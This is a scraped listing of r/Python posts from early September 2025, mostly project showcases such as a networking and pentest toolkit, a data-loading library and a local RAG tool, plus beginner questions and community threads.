1na61l2,"Ducky, my open-source networking & security toolkit for Network Engineers, Sysadmins, and Pentester",initCMD,56,10,2025-09-06 17:53:19,https://www.reddit.com/r/Python/comments/1na61l2/ducky_my_opensource_networking_security_toolkit/,"Hey everyone, For a long time, I've been frustrated with having to switch between a dozen different apps for my networking tasks PuTTY for SSH, a separate port scanner, a subnet calculator, etc.

To solve this, I built¬†**Ducky**, a free and open-source, all-in-one toolkit that combines these essential tools into one clean, tabbed interface.

**What it does:**

* **Multi-Protocol Tabbed Terminal:**¬†Full support for SSH, Telnet, and Serial (COM) connections.
* **Network Discovery:**¬†An ARP scanner to find live hosts on your local network and a visual Topology Mapper.
* **Essential Tools:**¬†It also includes a Port Scanner, CVE Vulnerability Lookup, Hash Cracker, and other handy utilities.

**Target Audience:**  
I built this for anyone who works with networks or systems, including:

* **Network Engineers & Sysadmins:**¬†For managing routers, switches, and servers without juggling multiple windows.
* **Cybersecurity Professionals & Students:**¬†A great all-in-one tool for pentesting, vulnerability checks (CVE), and learning.
* **Homelabbers & Tech Enthusiasts:**¬†The perfect command center for managing your home lab setup.
* **Fellow Python Developers:**¬†To see a practical desktop application built with¬†**PySide6**.

**How you can help:**  
The project is 100% open-source, and I'm actively looking for contributors and feedback!

* **Report bugs or issues:**¬†Find something that doesn't work right? Please open an issue on GitHub.
* **Suggest enhancements:**¬†Have an idea for a new tool or an improvement? Let's discuss it!
* **Contribute code:**¬†Pull Requests are always welcome.
* **GitHub Repo (Source Code & Issues):**¬†[https://github.com/thecmdguy/Ducky](https://github.com/thecmdguy/Ducky)
* **Project Homepage:**¬†[https://ducky.ge/](https://ducky.ge/)

Thanks for taking a look!"
1na5fk2,From Stress to Success: Load Testing Python Apps ‚Äì Open Source Example,AgitatedFunction3721,13,4,2025-09-06 17:29:34,https://www.reddit.com/r/Python/comments/1na5fk2/from_stress_to_success_load_testing_python_apps/,"**What My Project Does:**  
This project demonstrates **load testing Python applications** and **visualizing performance metrics**. It uses a sample Python app, Locust for stress testing, Prometheus for metrics collection, and Grafana for dashboards. It‚Äôs designed to give a hands-on example of how to simulate load and understand app performance.

**Target Audience:**  
Developers and Python enthusiasts who want to learn or experiment with load testing and performance visualization. It‚Äôs meant as a **learning tool and reference**, not a production-ready system.

**Comparison:**  
Unlike generic tutorials or scattered examples online, this repo bundles everything together‚Äîapp, load scripts, Prometheus, and Grafana dashboards‚Äîso you can **see the full workflow from stress testing to visualization in one place**.

**Repo Link:**  
[https://github.com/Alleny244/locust-grafana-prometheus](https://github.com/Alleny244/locust-grafana-prometheus)

Would love feedback, suggestions, or improvements from the community!"
1na5fiq,A tool to create a database of all the items of a directory,RRTheGuy,0,25,2025-09-06 17:29:31,https://www.reddit.com/r/Python/comments/1na5fiq/a_tool_to_create_a_database_of_all_the_items_of_a/,"# What my project does

My project creates a database of all the items and sub-items of a directory, including the name, size, the number of items and much more.

And we can use it to quickly extract the files/items that takes the most of place, or also have the most of items, and also have a timeline of all items sorted by creation date or modification date.

# Target Audience

For anyone who want to determine the files that takes the most of place in a folder, or have the most items (useful for OneDrive problems)

For anyone who want to manipulate files metadata on their own.

For anyone who want to have a timeline of all their files, items and sub-items.

I made this project for myself, and I hope it will help others.

# Comparison

As said before, to be honest, I didn't really compare to others tools because I think sometimes comparison can kill confidence or joy and that we should mind our own business with our ideas.

I don't even know if there's already existing tools specialized for that, maybe there is.

And I'm pretty sure my project is unique because I did it myself, with my own inspiration and my own experience.

So if anyone know or find a tool that looks like mine or with the same purpose, feel free to share, it would be a big coincidence.

# Conclusion

Here's the project source code:¬†[https://github.com/RadoTheProgrammer/files-db](https://github.com/RadoTheProgrammer/files-db)

I did the best that I could so I hope it worth it. Feel free to share what you think about it.

Edit: It seems like people didn't like so I made this repository private and I'll see what I can do about it"
1na21zu,JollyRadio - A web based radio,Important-Sound2614,13,2,2025-09-06 15:14:15,https://www.reddit.com/r/Python/comments/1na21zu/jollyradio_a_web_based_radio/,"**What My Project Does** 

JollyRadio is a web based, simple radio where you can find lots of live streams. It's designed to be easy to navigate and have less extra fluff. 

**Target Audience** 

JollyRadio is for people who want to listen to radio! It has basic filtering to filter out bad stuff, but you may still need to know what to do and not do. 

**Comparison** 

Compared to other web based radios, JollyRadio is designed to be local-focused and more minimalistic. There are three sections, exploring, local stations and searching for stations. It is better if you want a easy, minimal interface.

**Technical Explanation**

JollyRadio is written in Python (Flask) with HTML (Bootstrap). I'm new to programming, so please don't expect a perfect product. It uses the RadioBrowser API to find the radio stations.

**Links**

GitHub Link: [https://github.com/SeafoodStudios/JollyRadio](https://github.com/SeafoodStudios/JollyRadio)

Radio Link: [https://tryjollyradio.seafoodstudios.com/](https://tryjollyradio.seafoodstudios.com/)"
1n9urtc,Automating Power Supply Measurements with PyVisa & Pytest,StreetTeacher2,9,0,2025-09-06 08:58:25,https://www.reddit.com/r/Python/comments/1n9urtc/automating_power_supply_measurements_with_pyvisa/,"**Target Audience:**

* R&D Development & Test Enginners
* Electrical Engineering Students
* Python Automation Experts

**What My Project Does:**

I created a small python library: [pypm-test](https://github.com/ammarkh95/pypm-test) which could be used for automating measurements with the pictured instruments.

You could also use it as reference to automate similar functions with your available instruments. The library is Python based and makes use of [PyVisa ](https://pyvisa.readthedocs.io/en/latest/)library for communction with electronic eqipment supporting [SCPI ](https://www.ivifoundation.org/About-IVI/scpi.html)standard.

The library also includes some [pytest-fixtures](https://docs.pytest.org/en/stable/explanation/fixtures.html) which makes it nice to use in automated testing environment.

Below I share summary of the hardware used and developed python library as well as some example results for an automated DC-DC converter measurements. You can find all the details in my [blog post](https://ak-experiments.blogspot.com/2025/09/automating-power-supply-measurements.html)

**Hardware:**

I had access to the following instruments:

[Keysight U3606B](https://www.keysight.com/us/en/support/U3606B/multimeter-dc-power-supply.html): Combination of a 5.5 digit digital multimeter and 30-W power supply in a single unit  
[Keysight U2723A:](https://www.keysight.com/us/en/products/source-measure-units-smu/u2722a-u2723a-usb-modular-source-measure-units-smu.html) Modular source measure unit (SMU) Four-quadrant operation (¬± 120 mA/¬± 20 V)

**Software:**

The developd library contain wrapper classes that implement the control and measurement functions of the above instruments.

The exposed functions by the SCPI interface are normally documented in the programming manuals of the equipment published online. So it was just a matter of going through the manuals to get the required [SCPI](https://www.ivifoundation.org/About-IVI/scpi.html) commands / queries for a given instrument function and then sending it over to the instrument using [PyVisa](https://pyvisa.readthedocs.io/en/latest/) write and query functions.

**Example:**

A classical example application with a power supply and source measure unit is to evaluate the efficiency of DC-DC conversion for a given system. It is also a nice candiate ""parameteric study"" for automation to see how does the output power compares to the input power (i.e. effeciency) at different inputs voltges / sink currents. You can view the code behind similar test directly from my repo [here](https://github.com/ammarkh95/pypm-test/blob/f5434110e7dffd4adeff23f09d9ca10877fc1dbb/testing/example_tests/test_dc_dc_converter.py#L84)"
1n9qlkv,What are some non-AI tools/extensions which have really boosted your work life or made life easier?,Ill-Pirate4249,49,75,2025-09-06 04:41:33,https://www.reddit.com/r/Python/comments/1n9qlkv/what_are_some_nonai_toolsextensions_which_have/,"It can be an extension or a CLI tool or something else, My work mainly involves in developing managing mid sized python applications deployed over aws. I mostly work through cursor and agents have been decently useful but these days all the development on programming tools seems to be about AI integration. Is there something that people here have been using that's come out in last few years and has made serious impact in how you do things? Can be open source or not, anything goes it just shouldn't be something AI or a framework."
1n9q2p1,"Python IDLE's practical upgrade: file tree, tabbed editing, console view using only stdlib+tkinter.",Beginning_Task_5515,6,6,2025-09-06 04:11:59,https://www.reddit.com/r/Python/comments/1n9q2p1/python_idles_practical_upgrade_file_tree_tabbed/,"I was tinkering with IDLE and wondered: what if it had just a few modern quality-of-life improvements, but implemented entirely with Python‚Äôs standard library (so no extra dependencies, just `tkinter`)?

Specifically:

* File tree view (browse/open files inside the IDE itself)
* Tabbed editing (each opened file gets its own tab)
* Console view embedded alongside tabs
* Still dead-simple, light, and portable

The idea isn‚Äôt to compete with full IDEs like PyCharm or VS Code, but to provide a *corporate-safe*, zero-install, batteries-included IDE that works even on fenced machines where you can‚Äôt pull in external editors or packages.

Think of it as ‚ÄúIDLE-plus‚Äù ‚Äî familiar, lightweight, but with just enough features to make small/medium coding tasks more pleasant.

I‚Äôm curious:

* Would people here find this genuinely useful?
* Do fenced corporate environments still rely on IDLE as the only safe option?
* Is it worth polishing into a small open-source project (maybe even proposing as an official IDLE enhancement)?

What do you think ‚Äî niche toy, or something that could actually see adoption?"
1n9ov57,Simple Python expression that does complex things?,Educational-Comb4728,280,117,2025-09-06 03:07:42,https://www.reddit.com/r/Python/comments/1n9ov57/simple_python_expression_that_does_complex_things/,"First time I saw `a[::-1]` to invert the list `a`, I was blown away. 

`a, b = b, a` which swaps two variables (without temp variables in between) is also quite elegant. 

  
What's your favorite example?"
1n9l3dr,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,1,0,2025-09-06 00:00:30,https://www.reddit.com/r/Python/comments/1n9l3dr/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1n9kste,Python Type System and Tooling Survey 2025 (From Meta & JetBrains),BeamMeUpBiscotti,17,0,2025-09-05 23:46:17,https://www.reddit.com/r/Python/comments/1n9kste/python_type_system_and_tooling_survey_2025_from/,"As mentioned in the title, this survey was developed by Meta & Jetbrains w/ community input to collect opinions around Python's type system and type-related tooling.

> The goal of this survey is to gain insights into the tools and practices you use (if any!), the challenges you face, and how you stay updated on new features. Your responses will help the Python typing community identify common blockers, improve resources, and enhance the overall experience of using Python's type system. Even if you have never actively used type hints in your code, your thoughts are still valuable and we want to hear from you.

Take the survey [here](https://docs.google.com/forms/d/e/1FAIpQLSeOFkLutxMLqsU6GPe60OJFYVN699vqjXPtuvUoxbz108eDWQ/viewform).

Original LinkedIn posts (so you know it's legit):

[Meta Open Source](https://www.linkedin.com/posts/meta-open-source_python-type-system-and-tooling-survey-2025-activity-7369400929546092548-A0hh?utm_source=share&utm_medium=member_desktop&rcm=ACoAAB9aSUsBqmxSbrhoW2URuDnxCgS5eVD1AS0)

[Python Software Foundation](https://www.linkedin.com/posts/thepsf_python-type-system-and-tooling-survey-2025-activity-7368968760252059648-ICjo?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAB9aSUsBqmxSbrhoW2URuDnxCgS5eVD1AS0)

"
1n9i3v4,–ü–æ–º–æ–≥–∏—Ç–µ —Ä–µ—à–∏—Ç—å –∑–∞–¥–∞–Ω–∏–µ –∏–∑ —É—á–µ–±–Ω–∏–∫–∞.,Lumfort,0,4,2025-09-05 21:49:32,https://www.reddit.com/r/Python/comments/1n9i3v4/–ø–æ–º–æ–≥–∏—Ç–µ_—Ä–µ—à–∏—Ç—å_–∑–∞–¥–∞–Ω–∏–µ_–∏–∑_—É—á–µ–±–Ω–∏–∫–∞/,"¬´–ù–∞–ø–∏—à–∏—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É , –≤ –∫–æ—Ç–æ—Ä–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ, –∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç, —Å–∫–æ–ª—å–∫–æ –≤ —ç—Ç–æ–º —á–∏—Å–ª–µ —Ü–∏—Ñ—Ä 0,1,2,3,4,5,6,7,8,9.¬ª
–£—á–µ–±–Ω–∏–∫ –í–∞—Å–∏–ª—å–µ–≤ –ê.–ù. –ü—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –ü–∞–π—Ç–æ–Ω –≤ –ø—Ä–∏–º–µ—Ä–∞—Ö –∏ –∑–∞–¥–∞—á–∞—Ö. "
1n9fb2a,Giving up on coding for the third time.,Flimsy_Bison_4215,0,28,2025-09-05 19:57:24,https://www.reddit.com/r/Python/comments/1n9fb2a/giving_up_on_coding_for_the_third_time/,"Context: I am 23 and I have tried to learn coding thrice, once in school, then undergrad, and last year. 

Python each time.

I make some progress, but soon I lose all interest. Not because of difficulty, but it just doesn‚Äôt capture my attention. 

I know coding is gonna be more or less essential soon and I have been trying to get into it because it plays well with my field (i.e. Finance - and yes I have tried an interdisciplinary approach) 

But I just don‚Äôt enjoy it. Any tips on how to make it more interesting as a learning process? "
1n9ew7e,am i slow at coding ? should i afraid ?,doktorfuturee,0,18,2025-09-05 19:40:50,https://www.reddit.com/r/Python/comments/1n9ew7e/am_i_slow_at_coding_should_i_afraid/,I started coding like 3 days ago specifically to python. First i looked to  a youtube  video about basics and then started to exercises in a site called genepy. It was easy at first but now i am at the mid level and spent 2.5 hours to code 'from\_roman\_numeral' function. I wanted to ask you is that slow for that code because after i finished the code looked so small to me. am i slow or it is normal?
1n9d8oj,I thought I'd give away my Python eBook (pdf) for free.,caudor,4,4,2025-09-05 18:35:37,https://www.reddit.com/r/Python/comments/1n9d8oj/i_thought_id_give_away_my_python_ebook_pdf_for/,"If you are interested, you can click the top link on my landing page and download my eBook, ""Programming Basics in Python 3"" for free: [https://linktr.ee/chris4sawit](https://linktr.ee/chris4sawit)

I hope this 99 page pdf will be useful for someone interested in Python.  No donations will be requested.  Only info needed is an email address to get the download link."
1n98zq3,Winion: a Linux-like command interpreter for Windows with built-in package manager (Coming September,Wonderful-Reserve728,0,5,2025-09-05 15:53:54,https://www.reddit.com/r/Python/comments/1n98zq3/winion_a_linuxlike_command_interpreter_for/,"Salut tout le monde,

Je suis en train de d√©velopper¬†**Winion**, un nouvel interpr√©teur de ligne de commande pour Windows qui se comporte comme un terminal Linux. Il est livr√© avec :

* Un gestionnaire de paquets int√©gr√© pour une installation facile des outils
* Des commandes et des flux de travail de style Linux (`apt`, etc.)
* Prise en charge des scripts et de l'automatisation similaire aux shells Linux

Il est con√ßu pour les utilisateurs avanc√©s de Windows qui veulent une exp√©rience de terminal de type Linux sans quitter Windows.

**Date de sortie :**¬†Septembre 2025 Je recherche des retours et des testeurs pr√©coces pour l'am√©liorer avant le lancement.

Des captures d'√©cran et des GIF de son fonctionnement sont disponibles dans le d√©p√¥t.

GitHub :¬†[https://github.com/JuanForge/Winion](https://github.com/JuanForge/Winion)

J'adorerais savoir ce que vous en pensez !

[https://youtu.be/dEWdlBmZ1\_o](https://youtu.be/dEWdlBmZ1_o)"
1n97j3w,Free GPU options for training LLaMA 7B?,Square-Speaker2033,0,4,2025-09-05 14:57:12,https://www.reddit.com/r/Python/comments/1n97j3w/free_gpu_options_for_training_llama_7b/,"Hi,

I‚Äôm looking for concrete experiences on a mix of hardware resources and model training logic.

Goal: train or adapt a LLaMA 7B model (no QLoRA quantization, full precision) for a very specific use case. The purpose is not creative chatting but to build a model that can understand natural language instructions and reliably map them to predefined system actions. For example:

if I say ‚Äúshut down the PC‚Äù ‚Üí it should map directly to the correct command without inventing anything,

if I say ‚Äúcreate a file called new folder‚Äù ‚Üí it should trigger the correct action,

it should only pick from a database of known actions and nothing else.


Constraints / challenges:

I need a free or very low-cost environment with enough GPU power (Colab, community servers, credits, etc.) to actually handle a 7B model in full precision.

If full 7B without quantization is unrealistic, what are the most practical alternatives (smaller models, different architectures) while keeping the text ‚Üí action reliability?

How to add conversation memory so the model can keep track of context across multiple commands?

I‚Äôm especially interested in ready-to-use setups that people have already tested (not just theoretical advice).


In short: has anyone successfully trained or used a model in this setup (natural language ‚Üí action database, no hallucinations) with free or accessible resources? Which tools/environments would you recommend?

Thanks in advance for any insights.
"
1n96z9e,Python equivalent for Mark comments (Swift),bgdnandrew,5,2,2025-09-05 14:35:53,https://www.reddit.com/r/Python/comments/1n96z9e/python_equivalent_for_mark_comments_swift/,"Is there such thing? Paired with XCode's jump bar, I qucikly grew to love the Mark-type comments and how they help you to quickly naviagte and understand someone else's code."
1n95jwd,AWS for Python devs - made simple,sebst,15,5,2025-09-05 13:39:25,https://www.reddit.com/r/Python/comments/1n95jwd/aws_for_python_devs_made_simple/,"**What is Stelvio?**  
Stelvio is a Python framework for managing and deploying AWS infrastructure. Instead of writing YAML, JSON, or HCL, you define your infrastructure in **pure Python**. The framework provides **smart defaults** for networking, IAM, and security so you can focus on your application logic rather than boilerplate setup.

With the `stlv` CLI, you can go from zero to a working AWS environment in seconds, without heavy configuration.

**What My Project Does**  
Stelvio lets Python developers:

* Spin up AWS resources (e.g. compute, storage, networking) using Python code.
* Deploy isolated environments (personal or team-based) with a single command.
* Skip most of the manual setup thanks to opinionated defaults for IAM roles, VPCs, and security groups.

The goal is to make cloud deployments **approachable to Python developers who aren‚Äôt infrastructure experts**.

**Target Audience**

* **Python developers** who want to deploy applications to AWS without learning all of Terraform or CloudFormation.
* **Small teams and projects** that need quick, reproducible environments.
* It‚Äôs designed for **real-world usage**, not just as a toy project, but it‚Äôs still early-stage and evolving rapidly.

**Comparison to Alternatives**

* Compared to **Terraform**: Stelvio is Python-native, so you don‚Äôt need to learn HCL or use external templating.
* Compared to **AWS CDK**: Stelvio emphasizes **zero setup** and **smart defaults**. CDK is very flexible but requires more boilerplate and AWS-specific expertise.
* Compared to **Pulumi**: Stelvio is lighter-weight and focuses narrowly on AWS, aiming to reduce complexity rather than cover all clouds.

**Links**

* GitHub: [https://github.com/michal-stlv/stelvio](https://github.com/michal-stlv/stelvio?utm_source=chatgpt.com)
* Website: [https://stelvio.dev](https://stelvio.dev?utm_source=chatgpt.com)"
1n95gzi,"[Showcase] Modernized Gower Distance Package - 20% Faster, GPU Support, sklearn Integration",Pitiful-Ad8345,4,0,2025-09-05 13:35:59,https://www.reddit.com/r/Python/comments/1n95gzi/showcase_modernized_gower_distance_package_20/,"**What My Project Does**
    
[Gower Express](https://github.com/momonga-ml/gower-express) is a modernized Python implementation of Gower distance calculation for mixed-type data (categorical + numerical). It computes pairwise distances between records containing both categorical and numerical features without requiring preprocessing or encoding.
    

**Target Audience**
    
It's for data scientists and ML engineers working with uses for customer segmentation, mixed clinical data, recommendation with tabular data, and clustering tasks.
    
This replaces the unmaintained `gower` package (last updated 2022) with modern Python standards.
    
**Comparison**
    
Unlike the original `gower` package (unmaintained since 2022), this implementation offers 20% better performance via Numba JIT, GPU acceleration through CuPy (3-5x speedup), and native scikit-learn integration. Compared to UMAP/t-SNE embeddings, Gower provides deterministic results without hyperparameter tuning while maintaining full interpretability of distance calculations.

    
**Installation & Usage**
    
```python
pip install gower_exp[gpu,sklearn]
```
    
```python
import gower_exp as gower
from sklearn.cluster import AgglomerativeClustering
    
# Mixed data (categorical + numerical)
distances = gower.gower_matrix(customer_data)
clusters = AgglomerativeClustering(metric='precomputed').fit(distances)
    
# GPU acceleration for large datasets
distances = gower.gower_matrix(big_data, use_gpu=True)
    
# Find top-N similar items (memory-efficient)
similar = gower.gower_topn(target_item, catalog, n=10)
```
    
**Performance**

| Dataset Size | CPU Time | GPU Time | Memory Usage |
|--------------|----------|----------|--------------|
| 1K records   | 0.08s    | 0.05s    | 12MB         |
| 10K records  | 2.1s     | 0.8s     | 180MB        |
| 100K records | 45s      | 12s      | 1.2GB        |
| 1M records   | 18min    | 3.8min   | 8GB          |

Source: https://github.com/momonga-ml/gower-express
    
I built it with Claude Code assistance over a weekend. Happy to answer questions about the implementation or discuss when classical methods outperform modern embeddings!"
1n9267v,I built a visual component library for instrumentation,tinoomihael,68,11,2025-09-05 11:01:47,https://www.reddit.com/r/Python/comments/1n9267v/i_built_a_visual_component_library_for/,"Hello everyone,

as Python is growing more and more in industrial field, I decided to create visual component library for instrumentation.

**What My Project Does:**  
A Python library with **40+ visual and non-visual components** for building industrial and lab GUIs. Includes analog instruments, sliders, switches, buttons, graphs, and oscilloscope & logic analyzer widgets (PyVISA-compatible). Components are **highly customizable** and designed with a **retro industrial look**.

**Target Audience:**  
Engineers, scientists, and hobbyists building technical or industrial GUIs. Suitable for both **prototypes and production-ready applications**.

**Comparison / How It‚Äôs Different:**  
Unlike general GUI frameworks, this library is **instrumentation-focused** with ready-made industrial-style meters, gauges, and analyzer components‚Äîsaving development time and providing a consistent professional look.

**Demo:** [Imgur](https://imgur.com/a/0j89hPf?utm_source=chatgpt.com) (Not all components are being shown, just a small sneek-peak)  
**GitHub Repo:** [Thales](https://github.com/tino-posedi/Thales?utm_source=chatgpt.com) (private, still in progress)

**Feedback Questions:**

* Are there components you‚Äôd find particularly useful for industrial or lab GUIs?
* Is the retro industrial style appealing, or would you prefer alternative themes?
* Any suggestions for improving customization, usability, or performance?"
1n91acl,"Showcase: I co-created dlt, an open-source Python library that lets you build data pipelines in minu",Thinker_Assignment,71,27,2025-09-05 10:11:57,https://www.reddit.com/r/Python/comments/1n91acl/showcase_i_cocreated_dlt_an_opensource_python/,"As a 10y+ data engineering professional, I got tired of the boilerplate and complexity required to load data from messy APIs and files into structured destinations. So, with a team, I built `dlt` to make data loading ridiculously simple for anyone who knows Python.

**Features:**

* ‚û°Ô∏è **Load anything with Schema Evolution:** Easily pull data from any API, database, or file (JSON, CSV, etc.) and load it into destinations like DuckDB, BigQuery, Snowflake, and more, handling types and nested data flawlessly.
* ‚û°Ô∏è **No more schema headaches:** `dlt` automatically creates and maintains your database tables. If your source data changes, the schema adapts on its own.
* ‚û°Ô∏è **Just write Python:** No YAML, no complex configurations. If you can write a Python function, you can build a production-ready data pipeline.
* ‚û°Ô∏è **Scales with you:** Start with a simple script and scale up to handle millions of records without changing your code. It's built for both quick experiments and robust production workflows.
* ‚û°Ô∏è **Incremental loading solved:** Easily keep your destination in sync with your source by loading only new data, without the complex state management.
* ‚û°Ô∏è **Easily extendible:** `dlt` is built to be modular. You can add new sources, customize data transformations, and deploy anywhere.

**Link to repo:**[https://github.com/dlt-hub/dlt](https://github.com/dlt-hub/dlt)

Let us know what you think! We're always looking for feedback and contributors.

# What My Project Does

`dlt` is an open-source Python library that simplifies the creation of robust and scalable data pipelines. It automates the most painful parts of Extract, Transform, Load (ETL) processes, particularly schema inference and evolution. Users can write simple Python scripts to extract data from various sources, and `dlt` handles the complex work of normalizing that data and loading it efficiently into a structured destination, ensuring the target schema always matches the source data.

# Target Audience

The tool is for **data scientists, analysts, and Python developers** who need to move data for analysis, machine learning, or operational dashboards but don't want to become full-time data engineers. It's perfect for anyone who wants to build production-ready, maintainable data pipelines without the steep learning curve of heavyweight orchestration tools like Airflow or writing extensive custom code. It‚Äôs suitable for everything from personal projects to enterprise-level deployments.

# Comparison (how it differs from existing alternatives)

Unlike complex frameworks such as **Airflow** or **Dagster**, which are primarily orchestrators that require significant setup, `dlt` is a lightweight library focused purely on the ""load"" part of the data pipeline. Compared to writing **custom Python scripts** using libraries like `SQLAlchemy` and `pandas`, `dlt` abstracts away tedious tasks like schema management, data normalization, and incremental loading logic. This allows developers to create declarative and resilient pipelines with far less code, reducing development time and maintenance overhead."
1n90ss5,Sphinx Docs Translation: tutorial and template,mattdocumatt,3,0,2025-09-05 09:41:42,https://www.reddit.com/r/Python/comments/1n90ss5/sphinx_docs_translation_tutorial_and_template/,"Localizing documentation, manuals, or help is a challenging task. But it‚Äôs also an area where¬†Sphinx documentation generator¬†really shines.  I wrote [tutorial how to localize Sphinx docs](https://documatt.com/blog/25/sphinx-translation-tutorial/) and [sample repository](https://github.com/liborjelinek/sphinx-doc-i18n-example) to showcase a full localization workflow on a minimal yet realistic Sphinx documentation example. If you‚Äôre maintaining docs in multiple languages, this might help you get started."
1n8ryo5,Highly relevant moderation rant,Druber13,0,9,2025-09-05 01:16:46,https://www.reddit.com/r/Python/comments/1n8ryo5/highly_relevant_moderation_rant/,"I‚Äôve tried several times to ask questions or get advice here and things have been flagged, reported, and removed. It‚Äôs never been why isn‚Äôt my hello world working or other super basic things. 

I think this really needs to be adjusted as most online searches are useless now days. The amount of AI garbage you get when looking stuff up is out of hand. Stack overflow is about useless for anything I‚Äôve looked at recently. 

Leaving folk looking for somewhere like this to find real people that can actually help or offer useful opinions. In fact typing this is telling me it‚Äôs probably going to be flagged‚Ä¶. It feels like this is defending the purpose of this subreddit and any community that can be built. "
1n8roey,What Server to use for YOLOv11.,Batkid_760,0,2,2025-09-05 01:03:05,https://www.reddit.com/r/Python/comments/1n8roey/what_server_to_use_for_yolov11/,"Hello,

I am looking for a compute server systems that uses YOLOv11 on high resolution Hikvision IP cameras. Rough 20-25 cameras will be installed for object detection and will need a high GPU and CPU. What do you guys recommend? "
1n8qcam,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,4,1,2025-09-05 00:00:47,https://www.reddit.com/r/Python/comments/1n8qcam/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1n8lp06,Notes for Python,Trustycoat,0,2,2025-09-04 20:45:49,https://www.reddit.com/r/Python/comments/1n8lp06/notes_for_python/,"I have completed the course for Python and now want to have a complete notes. I made my notes but it‚Äôs lost now.
A complete structured note would be very helpful.
Here‚Äôs the course that I did:-
100 days of python by code with harry
https://youtube.com/playlist?list=PLu0W_9lII9agwh1XjRt242xIpHhPT2llg&si=8P7E4j1RuSqOiVRI"
1n8jasr,"I'm building local, open-source, fast minimal, and extendible python RAG library and CLI tool",Avienir,17,1,2025-09-04 19:13:21,https://www.reddit.com/r/Python/comments/1n8jasr/im_building_local_opensource_fast_minimal_and/,"  
I got tired of overengineered and bloated AI libraries and needed something to prototype local RAG apps quickly so I decided to make my own library,  
Features:  
‚û°Ô∏è Get to prototyping local RAG applications in seconds: uvx rocketrag prepare & uv rocketrag ask is all you need  
‚û°Ô∏è CLI first interface, you can even visualize embeddings in your terminal  
‚û°Ô∏è Native llama.cpp bindings - no Ollama bullshit  
‚û°Ô∏è Ready to use minimalistic web app with chat, vectors visualization and browsing documents‚û°Ô∏è Minimal footprint: milvus-lite, llama.cpp, kreuzberg, simple html web app  
‚û°Ô∏è Tiny but powerful - use any chucking method from chonkie, any LLM with .gguf provided and any embedding model from sentence-transformers  
‚û°Ô∏è Easily extendible - implement your own document loaders, chunkers and BDs, contributions welcome!  
Link to repo: [https://github.com/TheLion-ai/RocketRAG](https://github.com/TheLion-ai/RocketRAG)  
Let me know what you think. If anybody wants to collaborate and contribute DM me or just open a PR!  
  
**What My Project Does**  
RocketRAG is a high-performance Retrieval-Augmented Generation (RAG) library that loads documents (PDF/TXT/MD‚Ä¶), performs semantic chunking, indexes embeddings into a fast vector DB, then serves answers via a local LLM. It provides both a CLI and a FastAPI-based web server with OpenAI-compatible `/ask` and streaming endpoints, and is built to prioritize speed, a minimal code footprint, and easy extensibility

**Target Audience**  
Developers and researchers who want a fast, modular RAG stack for local or self-hosted inference (GGUF / llama-cpp-python), and teams who value low-latency document processing and a plug-and-play architecture. It‚Äôs suitable both for experimentation and for production-ready local/offline deployments where performance and customizability matter. 

**Comparison (how it differs from existing alternatives)**  
Unlike heavier, opinionated frameworks, RocketRAG focuses on performance-first building blocks: ultra-fast document loaders (Kreuzberg), semantic chunking (Chonkie/model2vec), Sentence-Transformers embeddings, Milvus Lite for sub-millisecond search, and llama-cpp-python for GGUF inference ‚Äî all in a pluggable architecture with a small footprint. The goal is lower latency and easier swapping of components compared to larger ecosystems, while still offering a nice CLI "
1n8gzmy,What is an application?,_Drkshdw_,0,15,2025-09-04 17:45:48,https://www.reddit.com/r/Python/comments/1n8gzmy/what_is_an_application/,"If I write a hello world print statement in a Python file and that's it, is that considered an application? 

My friend is arguing with me about what an application and a micro service is. I keep saying that micro services are just small applications, and  that even a hello world print in a Python statement is considered an application, but he's saying no. 

Who's right?"
